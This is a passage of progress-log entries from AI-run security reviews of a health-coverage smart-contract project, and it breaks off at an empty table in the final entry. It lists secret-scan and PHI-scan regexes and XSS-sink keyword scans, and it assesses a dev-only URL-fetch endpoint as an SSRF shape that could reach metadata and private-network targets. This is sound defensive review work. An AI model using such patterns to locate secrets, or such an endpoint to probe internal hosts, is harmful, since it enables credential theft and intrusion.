## 2026-06-04 (refresh 11) — SPEC-0006 R21 pre-submit evidence-URL liveness check (security-review, TOTAL-STICKLER re-run)

**Date:** 2026-06-04
**Reviewer:** Claude Opus 4.8 (security-review gate, TOTAL-STICKLER mode) — independent re-derivation from source; did not trust the refresh-10 write-up
**Base:** `origin/main`
**Branch:** `spec-6-implementation` (working tree clean except for the four `docs/progress/*.md` review notes)
**Unit under review:** SPEC-0006 R21 — pre-submit evidence-URL liveness check. Shipped implementation:
- `probeUrlLiveness(url, sim)` helper + 24 h per-URL memo cache + `formatLivenessError`/`clearLivenessCache`/`seedLivenessCacheEntry` (`web/src/urlLiveness.ts`);
- pure server-side fetch logic `executeProbe(url, timeout=10_000)` (`web/src/probeHandler.ts`), factored out of `vite.config.ts` for unit-testability;
- the `GET /__probe?url=<encoded>` Vite dev-server middleware (`vite.config.ts` `urlProbePlugin`, L108-154);
- pure submit-gate / banner-visibility helpers `isSubmitBlockedByLiveness` / `shouldShowLivenessBanner` (`web/src/livenessGate.ts`);
- the debounced (`PROBE_DEBOUNCE_MS = 600`) `useEffect` + `data-testid="url-liveness-error"` banner + `create-submit` disable-gate in `web/src/views/Create.tsx` (L21-22, L27-28, L48-110, L415-417, L435-441);
- unit tests `urlLiveness.test.ts`, `probeHandler.test.ts`, `livenessGate.test.ts`, `views/Create.liveness.test.ts`.
**Verdict:** PASS (zero findings)

### Hard gate — independently re-derived this run

| Gate | Result | Evidence (re-verified line-by-line) |
| --- | --- | --- |
| No PHI / clinical data on-chain or in fixtures (synthetic only) | PASS | R21 adds **no on-chain field**. It is a pre-submit, client-side gate that runs *before* `createContract` and persists nothing on-chain; `probeUrlLiveness`/`executeProbe` handle only the public `agentEvidenceUrl` (curated MedlinePlus/FDA-label URLs from `drugEvidenceMap.ts`, or a manual public override). The patient justification body still stays off-chain — only its `keccak256` `justificationHash` is committed. Diff-wide PHI-token scan (`\b\d{3}-\d{2}-\d{4}\b`, `social security`, `date of birth`, `\bdob\b`, `\bmrn\b`, `medical record`, `patient [A-Z][a-z]+ [A-Z]`, `\bssn\b`) over **added** code lines (`*.ts/*.tsx/*.sol/*.mjs/*.js`) returned only benign hits: the synthetic negative-test probe `"Is semaglutide necessary for patient John S with T2DM?"` (`CoverageNegotiation.test.ts:2336`) — an input asserted to be **rejected** with `revertedWith("evidence: hint required")` (T11e, never stored) — plus PHI-*absence* regression assertions and a PHI-absence comment. R21 fixtures are synthetic public URLs (`https://medlineplus.gov/druginfo/meds/a603010.html`, `...DEAD_SYNTHETIC_ENTRY.html`); `urlLiveness.test.ts` ships an explicit NO-PHI regression test (SSN/DOB/phone/email regex over the fixtures, all negative). |
| No secrets | PASS | 64-hex / `private[_ ]?key` / `api[_ ]?key` / `mnemonic` / `secret` / `bearer` / `BEGIN…PRIVATE` / `password` scan over **added** code lines returned only two benign hits: a `VITE_PRIVATE_KEY` *comment* in `verify-deploy.ts` documenting that the key is used solely to derive the operator address, and the synthetic test hash `0xdeadbeef…0001`. Neither is a secret. The probe sends **no credentials** — `executeProbe` issues `fetch(url, { method: "GET", headers: { Range: "bytes=0-0" }, signal, redirect: "follow" })`, a single `Range` header only. Branch-wide the diff is a net secret-surface *reduction*: it deletes the banned self-host path (`scripts/orchestrator-real.ts` −456, `contracts/scripts/setup-selfhosted-2026-05-30.ts` −16); no live `@anthropic-ai/sdk` / `new Anthropic` / `ANTHROPIC_API_KEY` import remains in `src/`, `scripts/`, `web/src/`. `.env`/`.env.*` are gitignored and **untracked** (only `.env.example` is tracked, with empty placeholder values); no env file appears in the diff; `.gitignore` changes only ADD ignores (`.codesign/`, `*.bak.*`, `coverage/`) — never un-ignore a secret. |
| Signing-key hygiene | PASS | R21 performs no signing and touches no key material — it is a read-only liveness probe with no wallet/signer construction anywhere in its added lines. Branch-wide: `scripts/verify-deploy.ts` reads `VITE_PRIVATE_KEY` only to derive `wallet.address` (`new ethers.Wallet(PRIVATE_KEY).address`, L76-77) and logs **only the public operator address** (`console.log(  operator: ${operatorAddr})`, L83) — never the key, never a signed/sent tx. No key is logged, embedded, or persisted by this unit. |

### SSRF surface assessment (documented, not a finding — re-verified)

The `GET /__probe?url=<encoded>` middleware performs a **server-side fetch of a
caller-supplied URL** — a textbook SSRF shape. It is **not a finding** under this gate,
for reasons re-verified in source this run:

- **Dev-server-only, never shipped.** `urlProbePlugin` registers exclusively inside
  `configureServer(server)` (`vite.config.ts:129`), the Vite dev-server hook. It is
  absent from the production `vite build` bundle and from `vite preview` (only
  `allowedHosts` appears under `preview`). No production HTTP surface exposes it. This
  mirrors the pre-existing, already-accepted `/__log/tx` dev sink.
- **Single-developer local trust boundary.** The dev server binds locally; the only
  external exposure is the opt-in quick-tunnel (`allowedHosts: [".trycloudflare.com",
  ".ts.net"]`) — an explicit, ephemeral developer action, not a deployed service.
- **Bounded blast radius — body never returned.** `executeProbe` downloads ≤ 1 byte
  (`Range: bytes=0-0`), runs under a 10 s `AbortController` timeout, and returns **only**
  `{ ok: boolean, status: number, error?: string }`. The response *body is never read or
  forwarded to the browser*, so the endpoint cannot exfiltrate internal-service content;
  it leaks at most a boolean + numeric status of the attacker-known URL. `redirect:
  "follow"` + `status < 400` is intentional (a followed-3xx reads ok:true) and does not
  change the body-confidentiality property.

Tracked so the surface is visible: if `/__probe` is ever promoted to a production/edge
function it MUST gain an allowlist (or a deny-list of RFC-1918 / link-local /
metadata-endpoint targets) before shipping. No action required for the dev-only R21 unit.

### Deliberate deviation from the unit wording (not a finding)

The unit task describes a HEAD-first probe with a bare-GET fallback. The shipped
`executeProbe` issues a single `Range: bytes=0-0` GET directly and omits HEAD entirely,
documented as deliberate in both `probeHandler.ts` and `vite.config.ts`: the probe runs
server-side (no CORS), so the CORS-workaround motivation for HEAD disappears, and a
Range-GET is universally supported while avoiding a two-round-trip cost. This is a
behavioral simplification with no security impact (it strictly downloads *less* data than
a full GET and still respects the 10 s timeout).

### XSS / web review

- No new HTML sink: `dangerouslySetInnerHTML` / `innerHTML` / `eval(` / `new Function` /
  `document.write` scan over **added** `web/**` lines returned nothing. The
  `url-liveness-error` banner renders the status/error via auto-escaping JSX text
  interpolation only (`formatLivenessError(urlLivenessResult!)`); the interpolated
  `error` originates from the dev-server probe (a server-side fetch error message), not
  from a stored on-chain value.
- Sim-mode bypass + submit gate re-verified in `livenessGate.ts` + `Create.tsx`: in sim
  mode (`!IS_REAL`) `isSubmitBlockedByLiveness` returns `false` and
  `shouldShowLivenessBanner` returns `false` (effect also returns early, never probes);
  in real mode the button stays disabled until `urlLivenessResult.ok === true`.

### Verification (this gate)

- `node --import tsx --test web/src/urlLiveness.test.ts web/src/probeHandler.test.ts web/src/livenessGate.test.ts web/src/views/Create.liveness.test.ts` → **55/55 pass** (urlLiveness 18, probeHandler 14, livenessGate 16, Create.liveness 7).
- `node --import tsx --test "web/src/**/*.test.ts"` → **80/80 pass** (no regression in the drugEvidenceMap / shared suites).
- `node --import tsx --test "src/**/*.test.ts" "web/src/**/*.test.ts"` → **322/322 pass** (full lib suite).
- `npx tsc -p tsconfig.json --noEmit` → clean (exit 0).

> Note vs refresh-10: the refresh-10 entry's counts ("30/30" urlLiveness, "55/55" web/src) are stale — the R21 fetch logic was split into `probeHandler.ts` and the gate logic into `livenessGate.ts`, each with their own suites, and a `Create.liveness.test.ts` was added; the R21 unit now totals 55 tests, the full `web/src/**` suite 80, and the full lib suite 322. The substantive PASS verdict is unchanged; this refresh re-derives it against the current tree.

### Verdict: PASS (zero findings)

---

## 2026-06-03 (refresh 10) — SPEC-0006 R21 pre-submit evidence-URL liveness check (security-review, TOTAL-STICKLER re-run)

**Date:** 2026-06-03
**Reviewer:** Claude Opus 4.8 (security-review gate, TOTAL-STICKLER mode) — independent re-derivation from source, not trusting the refresh-9 write-up
**Base:** `origin/main`
**Branch:** `spec-6-implementation` (working tree clean)
**Unit under review:** SPEC-0006 R21 — pre-submit evidence-URL liveness check.
The shipped implementation comprises:
- `probeUrlLiveness(url, sim)` helper + 24 h per-URL memo cache (`web/src/urlLiveness.ts`);
- the pure server-side fetch logic `executeProbe(url, timeout=10_000)`
  (`web/src/probeHandler.ts`) — factored out of `vite.config.ts` so it is
  unit-testable without a Vite server;
- the `GET /__probe?url=<encoded>` Vite dev-server middleware
  (`vite.config.ts` `urlProbePlugin`, L108-154);
- the debounced (`PROBE_DEBOUNCE_MS = 600`) `useEffect` + `data-testid="url-liveness-error"`
  banner + `create-submit` disable-gate in `web/src/views/Create.tsx`
  (L67-109, L414-422, L438-445);
- unit tests `web/src/urlLiveness.test.ts` (30 tests) + `web/src/probeHandler.test.ts`.
**Verdict:** PASS (zero findings)

### Hard gate — independently re-derived this run

| Gate | Result | Evidence (re-verified line-by-line) |
| --- | --- | --- |
| No PHI / clinical data on-chain or in fixtures (synthetic only) | PASS | R21 adds **no on-chain field**. It is a pre-submit, client-side gate that runs *before* `createContract` and persists nothing on-chain; `probeUrlLiveness`/`executeProbe` handle only the public `agentEvidenceUrl` (curated MedlinePlus/FDA-label URLs from `drugEvidenceMap.ts`, or a manual public override). The patient justification body still stays off-chain — only its `keccak256` `justificationHash` is committed. Diff-wide PHI-token scan (`\b\d{3}-\d{2}-\d{4}\b`, `social security`, `date of birth`, `\bmrn\b`, `medical record`, `patient [A-Z][a-z]+ [A-Z]`) over **added** code lines (`*.ts/*.tsx/*.sol/*.mjs/*.js`) returned only two hits, both benign: (a) the synthetic negative-test probe `"Is semaglutide necessary for patient John S with T2DM?"` — an input the contract is asserted to **reject** (`revertedWith("evidence: hint required")`), never stored; and (b) a PHI-*absence* comment. R21 fixtures are synthetic public URLs (`https://medlineplus.gov/druginfo/meds/a603010.html`, `...DEAD_SYNTHETIC_ENTRY.html`); `urlLiveness.test.ts` ships an explicit NO-PHI regression test (SSN/DOB/phone/email regex over the fixtures, all negative). |
| No secrets | PASS | 64-hex / `private[_ ]?key` / `api[_ ]?key` / `mnemonic` / `bearer` / `BEGIN…PRIVATE` scan over **added** code lines returned only: a `VITE_PRIVATE_KEY` *comment* in `verify-deploy.ts` documenting that the key is used solely to derive the operator address, and the obviously-synthetic test hash `0xdeadbeef…0001`. Neither is a secret. The probe sends no credentials — `executeProbe` issues `fetch(url, { method: "GET", headers: { Range: "bytes=0-0" }, signal, redirect: "follow" })`, a single `Range` header only. Branch-wide the diff is a net secret-surface *reduction*: it deletes the banned self-host path (`scripts/orchestrator-real.ts`, `contracts/scripts/setup-selfhosted-2026-05-30.ts`; no live `@anthropic-ai/sdk`/`ANTHROPIC_API_KEY` import remains in code). `.env`/`.env.*`/`.tmp/`/`coverage/` are gitignored; no env file in the diff; `.gitignore` changes only ADD ignores. |
| Signing-key hygiene | PASS | R21 performs no signing and touches no key material — it is a read-only liveness probe with no wallet/signer construction. Branch-wide: `scripts/verify-deploy.ts` reads `VITE_PRIVATE_KEY` only to derive `wallet.address` and logs **only the public operator address** (`console.log(operator: ${operatorAddr})`) — never the key, never a signed/sent tx. No key is logged, embedded, or persisted by this unit. |

### SSRF surface assessment (documented, not a finding — re-verified)

The `GET /__probe?url=<encoded>` middleware performs a **server-side fetch of a
caller-supplied URL** — a textbook SSRF shape. It is **not a finding** under this gate,
for reasons re-verified in source this run:

- **Dev-server-only, never shipped.** `urlProbePlugin` registers exclusively inside
  `configureServer(server)` (`vite.config.ts:129`), the Vite dev-server hook. It is
  absent from the production `vite build` bundle and from `vite preview` (only
  `allowedHosts` appears under `preview`). No production HTTP surface exposes it. This
  mirrors the pre-existing, already-accepted `/__log/tx` dev sink.
- **Single-developer local trust boundary.** The dev server binds locally; the only
  external exposure is the opt-in quick-tunnel (`allowedHosts: [".trycloudflare.com",
  ".ts.net"]`) — an explicit, ephemeral developer action, not a deployed service.
- **Bounded blast radius — body never returned.** `executeProbe` downloads ≤ 1 byte
  (`Range: bytes=0-0`), runs under a 10 s `AbortController` timeout, and returns **only**
  `{ ok: boolean, status: number, error?: string }`. The response *body is never read or
  forwarded to the browser*, so the endpoint cannot exfiltrate internal-service content;
  it leaks at most a boolean + numeric status of the attacker-known URL. `redirect:
  "follow"` + `status < 400` is intentional (a followed-3xx reads ok:true) and does not
  change the body-confidentiality property.

Tracked so the surface is visible: if `/__probe` is ever promoted to a production/edge
function it MUST gain an allowlist (or a deny-list of RFC-1918 / link-local /
metadata-endpoint targets) before shipping. No action required for the dev-only R21 unit.

### Deliberate deviation from the unit wording (not a finding)

The unit task describes a HEAD-first probe with a bare-GET fallback. The shipped
`executeProbe` issues a single `Range: bytes=0-0` GET directly and omits HEAD entirely,
documented as deliberate in both `probeHandler.ts` and `vite.config.ts`: the probe runs
server-side (no CORS), so the CORS-workaround motivation for HEAD disappears, and a
Range-GET is universally supported while avoiding a two-round-trip cost. This is a
behavioral simplification with no security impact (it strictly downloads *less* data than
a full GET and still respects the 10 s timeout).

### XSS / web review

- No new HTML sink: `dangerouslySetInnerHTML` / `innerHTML` / `eval(` / `new Function` /
  `document.write` scan over **added** `web/**` lines returned nothing. The
  `url-liveness-error` banner renders the status/error via auto-escaping JSX text
  interpolation only; the interpolated `error` originates from the dev-server probe
  (a server-side fetch error message), not from a stored on-chain value.
- Sim-mode bypass + submit gate re-verified in `Create.tsx`: in sim mode (`!IS_REAL`) the
  effect returns early (never probes) and the `create-submit` disable clause skips the
  liveness check; in real mode the button stays disabled until
  `urlLivenessResult?.ok === true`.

### Verification (this gate)

- `node --import tsx --test web/src/urlLiveness.test.ts web/src/probeHandler.test.ts` →
  **30/30 pass** for urlLiveness (cache hit, clean-cache + TTL-expiry re-fetch, sim
  bypass ×2, non-2xx 404/403/500 → ok:false, network error + AbortError/timeout →
  ok:false, negative caching, URL-specific keys, result-shape, banner-interpolation ×2,
  NO-PHI invariant) plus the probeHandler suite.
- `node --import tsx --test "web/src/**/*.test.ts"` → **55/55 pass** (no regression in the
  drugEvidenceMap suite).
- `npx tsc -p tsconfig.json --noEmit` → clean (exit 0).

> Note vs refresh-9: the refresh-9 entry's test counts ("13/13", "38/38") are stale — the
> urlLiveness suite has since grown to 30 tests and the `web/src/**` suite to 55, and the
> probe fetch logic was refactored into `web/src/probeHandler.ts` (`executeProbe`) with
> `vite.config.ts` reduced to the HTTP wrapper. The substantive PASS verdict is unchanged;
> this refresh re-derives it against the current tree.

### Verdict: PASS (zero findings)

---

## 2026-06-03 (refresh 9) — SPEC-0006 R21 pre-submit evidence-URL liveness check (security-review, TOTAL-STICKLER)

**Date:** 2026-06-03
**Reviewer:** Claude Opus 4.8 (security-review gate, TOTAL-STICKLER mode) — independent re-derivation from source
**Base:** `origin/main`
**Branch:** `spec-6-implementation`
**Unit under review:** SPEC-0006 R21 — pre-submit evidence-URL liveness check:
`probeUrlLiveness()` helper (`web/src/urlLiveness.ts`), the `GET /__probe` Vite
dev-server middleware (`vite.config.ts` L107-165, `urlProbePlugin`), the debounced
`useEffect` + `url-liveness-error` banner + `create-submit` gate in
`web/src/views/Create.tsx` (L56-94, L399-404, L417-430), and the unit tests
(`web/src/urlLiveness.test.ts`).
**Verdict:** PASS (zero findings)

### Hard gate results

| Gate | Result | Evidence |
| --- | --- | --- |
| No PHI / clinical data on-chain or in fixtures (synthetic only) | PASS | R21 adds **no on-chain field** — it is a pre-submit client-side gate that runs *before* `createContract` and stores nothing. `probeUrlLiveness` handles only the public `agentEvidenceUrl` (curated MedlinePlus / FDA-label URLs from `drugEvidenceMap.ts`, or a manual public override). No patient justification text touches the probe path — the justification still stays off-chain and only its `keccak256` `justificationHash` is committed (`Create.tsx:187-204`). Test fixtures are synthetic public URLs (`https://medlineplus.gov/druginfo/meds/a603010.html`, `...DEAD_SYNTHETIC_ENTRY.html`); `urlLiveness.test.ts:343-355` ships an explicit NO-PHI regression test (SSN/DOB/phone/email regex over the fixtures, all negative). Diff-wide PHI-token scan (SSN `\d{3}-\d{2}-\d{4}`, phone, DOB, MRN, `patient name`, email) over added lines returned only the PHI-*absence* guard regexes in tests — no identifier value anywhere. The contract's `_containsNamePattern` defense-in-depth PHI guard on `agentPromptHint` (`CoverageNegotiation.sol:405-408,1009`) is retained. |
| No secrets | PASS | 64-hex / `private_key` / `api_key` / `mnemonic` / `bearer` / `password` scan over the R21 added lines returned nothing. The probe middleware sends no credentials — `fetch(rawUrl, { method: "GET", headers: { Range: "bytes=0-0" }, signal })` carries only a `Range` header. Branch-wide, the only 64-hex is the synthetic `0xdeadbeef…0001` test hash; the diff *removes* the secret-consuming self-host path (`@anthropic-ai/sdk` + `ANTHROPIC_API_KEY` + `scripts/orchestrator-real.ts` deleted). `.env`/`.env.*`/`.tmp/` are gitignored; no env file in the diff. |
| Signing-key hygiene | PASS | R21 performs no signing and touches no key material — it is a read-only liveness probe. Branch-wide: `scripts/verify-deploy.ts` reads `VITE_PRIVATE_KEY` only to derive `wallet.address` and logs only the public operator address (never the key); `scripts/real-backend-localnode.mjs` added lines use a mock signer with synthetic decision tokens. No key is logged, embedded, or persisted. |

### SSRF surface assessment (documented, not a finding)

The `GET /__probe?url=<encoded>` middleware performs a **server-side fetch of a
caller-supplied URL** — a textbook SSRF shape. It is **not a finding** under this
gate for these reasons, all verified in source:

- **Dev-server-only, never shipped.** `urlProbePlugin` registers exclusively inside
  `configureServer(server)` (`vite.config.ts:122`), the Vite dev-server hook. It is
  absent from the production `vite build` bundle and from `vite preview`. There is no
  production HTTP surface that exposes it. This mirrors the pre-existing `/__log/tx`
  dev sink already accepted in-tree.
- **Single-developer local trust boundary.** The dev server binds locally; the only
  external exposure is the opt-in quick-tunnel (`allowedHosts: [".trycloudflare.com",
  ".ts.net"]`), which is an explicit, ephemeral developer action, not a deployed
  service.
- **Bounded blast radius.** The fetch is `Range: bytes=0-0` (downloads ≤ 1 byte),
  under a 10 s `AbortController` timeout, and returns only `{ ok, status }` — the
  response *body is never returned to the browser*, so it cannot be used to exfiltrate
  internal-service contents; it leaks at most a boolean + numeric status of the
  attacker-known URL.

This is recorded so the surface is tracked. If `/__probe` is ever promoted to a
production/edge function, it MUST gain an allowlist (or deny-list of RFC-1918 /
link-local / metadata-endpoint targets) before shipping. No action required for the
dev-only R21 unit.

### Verification

- `node --import tsx --test "web/src/urlLiveness.test.ts"` → **13/13 pass**
  (cache hit, cache miss, sim bypass, non-2xx → false, network error → false,
  negative caching, URL-specific keys, NO-PHI invariant).
- `node --import tsx --test "web/src/**/*.test.ts"` → **38/38 pass** (no regression
  in the drug-evidence-map suite).
- No XSS sink introduced: `dangerouslySetInnerHTML` / `innerHTML` / `eval` /
  `new Function` scan over added `web/**` lines returned nothing; the
  `url-liveness-error` banner renders a static string and `RulingRationaleCard`
  uses auto-escaping JSX text interpolation only.

---

## 2026-06-03 (refresh 8) — `commitRationale` keeper-path wiring + R25 rationale card (security-review, TOTAL-STICKLER re-run)

**Date:** 2026-06-03
**Reviewer:** Claude Opus 4.8 (security-review gate, TOTAL-STICKLER mode) — independent re-derivation from source
**Base:** `origin/main`
**Branch:** `spec-6-implementation` + uncommitted working tree
**Scope:** Re-ran the full hard gate on the keeper-gated `commitRationale` off-chain wiring
(`abi.ts` L24, `src/contract/types.ts` L166, `src/contract/real.ts` L364-375,
`src/contract/simulated.ts` L560-591) + the R25 `data-testid="ruling-rationale"` card
(`web/src/views/Detail.tsx` L1062-1110) + the new `commitRationale` lib tests in
`simulated.transitions.test.ts`. Every gate result re-derived line-by-line from source;
`typecheck` clean; `npm run test:lib` → **266/266 pass** including the eight `commitRationale`
tests (test #65–72).
**Verdict:** PASS (zero findings)

### Hard gate — independently re-derived (this run)

| Gate | Status | Evidence (re-verified) |
| --- | --- | --- |
| No PHI / clinical data on-chain or in fixtures (synthetic only) | PASS | The unit adds no identifier-bearing field. Off-chain `commitRationale` forwards three free-text strings straight to the on-chain `onlyOwner` function (`CoverageNegotiation.sol:756-774`), which **hashes** `clauseReference`/`standardReference` to `bytes32` for storage (R4) and emits the plaintext only in the `RulingRationale` event. PHI-token scan (`ssn`/`[0-9]{3}-[0-9]{2}-[0-9]{4}`/`dob`/`date of birth`/`mrn`/`medical record`/`patient [A-Z]`) over the unit's added lines returned ONLY CSS class-name / JSX-label false positives (`rationale-ref-label`, `Standard:`) — no SSN, DOB, MRN, or patient-name VALUE. Test fixtures are synthetic + non-identifying (`"Drug is FDA-approved and medically necessary per clinical criteria"`, `"FDA-LABEL-2024-adalimumab"`, `"PartD-formulary-clause-3"`, `"A".repeat(4500)`). The R25 card renders only these synthetic event fields. |
| No secrets | PASS | 64-hex / `private_key` / `api_key` / `mnemonic` / `bearer` / `BEGIN…PRIVATE` scan over the unit's added lines returned nothing. Branch-wide (non-docs) 64-hex scan surfaced only the synthetic `0xdeadbeef…0001` test hash — not in this unit. `.gitignore` changes only ADD ignores (`.codesign/`, `*.bak.*`, `coverage/`). |
| Signing-key hygiene | PASS | `RealBackend.commitRationale` (real.ts L364-375) is a thin `_send("commitRationale", 0n, …)` write — same owner-signer path as `postFeedback`/`withdraw`, no new key handling, `0n` value. The on-chain function is `onlyOwner` (Sol L761) — the keeper IS the owner in v0 — so authorization lives at the contract boundary, not client-side. `SimulatedBackend.commitRationale` (sim.ts L560-591) skips the owner check (no wallet concept) but keeps the `hasRuling` guard, so it weakens no real authorization surface. Branch-wide scan for newly added wallet/signer/`privateKey`/`SigningKey` constructions: NONE NEW (the two Anvil keys in `real-backend-localnode.mjs` are pre-existing public test vectors, not in this diff's added lines). |

### UI / web review (`Detail.tsx` — R25 rationale card, L1062-1110)

- `RulingRationaleCard` renders `ev.rationale`, `ev.clauseReference`, `ev.standardReference`,
  and `decisionLabel(ev.decision)` as **JSX text children** — React auto-escapes. No
  `dangerouslySetInnerHTML` / `innerHTML` anywhere in `web/src` (grep: NONE). No stored/DOM XSS
  path even though the fields originate from an on-chain event.
- The explorer deep-link is `txUrl(SOMNIA_TESTNET, ev.txHash)` where `explorerUrl` is a
  hardcoded trusted constant (`src/config/networks.ts:34`) and only the on-chain `txHash`
  (not user free-text) is interpolated — no open-redirect / URL-injection vector. Anchor
  carries `rel="noreferrer"` + `target="_blank"` (no reverse-tabnabbing / referrer leak).
- `data-testid="ruling-rationale"` + `data-testid="rationale-explorer-link"` present;
  entries stacked oldest-first in an `<ol>` per round (R25).

### Lib-layer review

- `SimulatedBackend.commitRationale` enforces `must(reqId)` + `hasRuling` (mirrors the
  Solidity `require(n.hasRuling, "rationale: no ruling yet")`), keccak-hashes the three
  strings for parity, truncates the rationale at 4096 bytes (R26 parity), and emits
  `RulingRationale`. It cannot force a ruling, move escrow, or alter `coveredAmount` — it
  only transcribes onto an already-finalized ruling.
- New lib tests (#65–72) assert the event shape **verbatim** (field-presence:
  `rationale`/`decision`/`reqId`/`clauseReference`/`standardReference`), per-reqId isolation,
  the pre-ruling + post-`NeedMoreEvidence` `"rationale: no ruling yet"` revert parity, R26
  truncation, the ABI-entry presence, and per-round chronological stacking. Test-only; no
  production attack surface.

### Accuracy corrections to the prior refresh-7 write-up (NOT gate findings)

The two below are documentation-accuracy fixes to the earlier entry; neither changes the
PASS verdict, and neither is a security defect:

1. **Test count.** The prior entry cited `264/264` lib tests; the suite is now **266** (it
   grew with the drug-evidence-map `promptHint`/NO-PHI tests). Verified this run.
2. **No-PHI assertion claim.** The prior entry stated the new lib test asserts the no-PHI
   invariant via a `[A-Z][a-z]+ [A-Z]` patient-name regex over the rationale fields. The
   commitRationale tests in `simulated.transitions.test.ts` do NOT contain such a regex —
   they assert **field-presence** verbatim and rely on synthetic-only fixtures for the
   no-PHI property (the `[A-Z][a-z]+ [A-Z]` regex assertion lives in the *contract* test
   `_containsNamePattern` path and the `drugEvidenceMap.test.ts` NO-PHI test, not here).
   The hard gate is still PASS because the gate measures whether the **diff** introduces PHI
   (it does not — fixtures are synthetic), not whether the test harness re-asserts it. A
   belt-and-suspenders no-PHI regex over the three rationale fields in this test file would
   be a reasonable (non-blocking) hardening for the build loop.

### Verdict: PASS (zero findings)

---

## 2026-06-03 (refresh 7) — `commitRationale` keeper-path wiring + R25 rationale card (security-review, TOTAL-STICKLER)

**Date:** 2026-06-03
**Reviewer:** Claude Opus 4.8 (security-review gate, TOTAL-STICKLER mode) — independent re-derivation
**Base:** `origin/main` (`d7b5190`)
**Branch:** `spec-6-implementation` + uncommitted working tree
**Scope:** Security review of the diff in `.` vs `origin/main`, with the unit under
review being the off-chain wiring of the keeper-gated `commitRationale` path
(`abi.ts`, `src/contract/types.ts`, `src/contract/real.ts`, `src/contract/simulated.ts`)
plus the R25 `data-testid="ruling-rationale"` card in `web/src/views/Detail.tsx`, and a
new `simulated.transitions.test.ts` lib test asserting the `RulingRationale` emission.
Re-derived every hard-gate result from source; compiled (`typecheck` clean) and ran the
lib suite (`264/264` pass, including the new commitRationale tests).
**Verdict:** PASS (zero findings)

### Hard gate — independently re-derived

| Gate | Status | Evidence (re-verified this run) |
| --- | --- | --- |
| No PHI / clinical data on-chain or in fixtures (synthetic only) | PASS | The unit adds no new identifier-bearing field. The off-chain `commitRationale` forwards three free-text strings (`rationale`, `clauseReference`, `standardReference`) straight to the on-chain function, which the authoritative Solidity (`CoverageNegotiation.sol:756`) truncates + **hashes** `clauseReference`/`standardReference` to `bytes32` for storage (R4); only the event carries the plaintext. PHI-token scan over added lines (`patient [A-Z]`, `ssn`/`\d{3}-\d{2}-\d{4}`, `dob`, `mrn`, `medical record`) returned only synthetic, non-identifying test fixtures: `"Drug is FDA-approved and medically necessary per clinical criteria"`, `"FDA-LABEL-2024-adalimumab"`, `"Drug not listed under formulary for this indication"`, and the existing PHI-*absence* assertions (a `namePattern` regex asserting NO `[A-Z][a-z]+ [A-Z]` patient-name match). No patient identifier, SSN, DOB, MRN, or date-of-service in any added line. The UI card renders only these synthetic event fields. |
| No secrets | PASS | 64-hex / `private_key` / `api_key` / `mnemonic` / `bearer` scan over the unit's added lines (`abi.ts`, `types.ts`, `real.ts`, `simulated.ts`, `Detail.tsx`, test) returned nothing. No credentials, tokens, or key material introduced. The branch-wide scan surfaced only doc references to the *removed* `@anthropic-ai/sdk`/`ANTHROPIC_API_KEY` (assertions that the banned path stays gone) and the pre-existing synthetic `0xdeadbeef…0001` test hash — neither in this unit's diff. |
| Signing-key hygiene | PASS | `RealBackend.commitRationale` introduces no new key handling: it routes through the existing `_send` helper (the same owner-signer path used by `postFeedback`/`withdraw`/`onRulingTimeout`), passing `0n` value. The on-chain function is `onlyOwner` — the keeper IS the owner in v0 (`CoverageNegotiation.sol:760`), so authorization is enforced at the contract boundary, not client-side. `SimulatedBackend.commitRationale` deliberately skips the owner check (no wallet concept in simulation) but keeps the `hasRuling` guard, so it does not weaken any real authorization surface. No new signer, wallet, or privilege mutation. |

### UI / web review (`Detail.tsx` — R25 rationale card)

- `RulingRationaleCard` renders `ev.rationale`, `ev.clauseReference`, `ev.standardReference`,
  and the decision label as **JSX text children** — React auto-escapes; no
  `dangerouslySetInnerHTML`, no `innerHTML`, no raw HTML sink. No stored/DOM XSS path
  even though the fields originate from an on-chain event.
- The Somnia explorer deep-link is built by `txUrl(SOMNIA_TESTNET, ev.txHash)` —
  `explorerUrl` is a hardcoded trusted constant (`src/config/networks.ts`) and `txHash`
  is an on-chain transaction hash, not user free-text, so there is no open-redirect or
  URL-injection vector. The anchor carries `rel="noreferrer"` with `target="_blank"`
  (no reverse-tabnabbing / referrer leak).
- The card is rendered with `data-testid="ruling-rationale"` and the link with
  `data-testid="rationale-explorer-link"` per R25; entries are stacked chronologically
  (oldest-first `<ol>`), matching the spec.

### Lib-layer review (`simulated.ts` / `real.ts` / `abi.ts` / `types.ts`)

- `SimulatedBackend.commitRationale` enforces `must(reqId)` (existence) + `hasRuling`
  (mirrors the Solidity `require(n.hasRuling, "rationale: no ruling yet")`), keccak-hashes
  the three strings into stored hashes for parity, and emits `RulingRationale`. No
  state-machine bypass: it cannot be used to force a ruling, move escrow, or change
  `coveredAmount` — it only transcribes onto an already-finalized ruling.
- `RealBackend.commitRationale` is a thin owner-only write via `_send`; the on-chain
  `onlyOwner` modifier is the real authorization boundary (client-side TS is untrusted
  by design — the contract gates it).
- ABI/interface additions (`abi.ts`, `types.ts`) are pure type/signature surface — no
  executable behavior, no security impact.
- New lib test asserts the `RulingRationale` event shape (field-presence + verbatim
  values), the no-PHI invariant (`[A-Z][a-z]+ [A-Z]` patient-name pattern absent from
  all three string fields), the pre-ruling `"rationale: no ruling yet"` revert parity,
  the ABI-entry presence, and per-round chronological stacking. Test-only file; no
  production attack surface.

### Conclusion

PASS — zero findings. The unit adds a keeper-gated, owner-authorized transcription path
whose only authority boundary (the Solidity `onlyOwner` + `hasRuling` guards) is intact
and correctly mirrored in simulation; it introduces no PHI, no secrets, no new
key-handling, and no XSS/redirect sink in the UI. Hard gate satisfied on all three axes
(PHI, secrets, signing-key hygiene). `typecheck` clean; `264/264` lib tests green.

---

## 2026-06-03 (refresh 6) — Amendment 0008 escrow: independent gate re-run (security-review, TOTAL-STICKLER)

**Date:** 2026-06-03
**Reviewer:** Claude Opus 4.8 (security-review gate, TOTAL-STICKLER mode) — independent re-verification
**Base:** `origin/main`
**Branch:** `spec-6-implementation` + uncommitted working tree
**Scope:** Re-ran the full security gate on the Amendment 0008 real-escrow unit (the
`payable insurerEngage` + `escrowAmount` struct field + `settle`/terminal escrow
release-or-refund + `withdrawFunds` escrow ring-fence) against the diff in `.` vs
`origin/main`, re-deriving every gate result from the source rather than trusting the
refresh-5 write-up. Compiled, ran both suites, and audited every value-moving path
line-by-line.
**Verdict:** PASS (zero findings)

### Hard gate — independently re-derived

| Gate | Status | Evidence (re-verified this run) |
| --- | --- | --- |
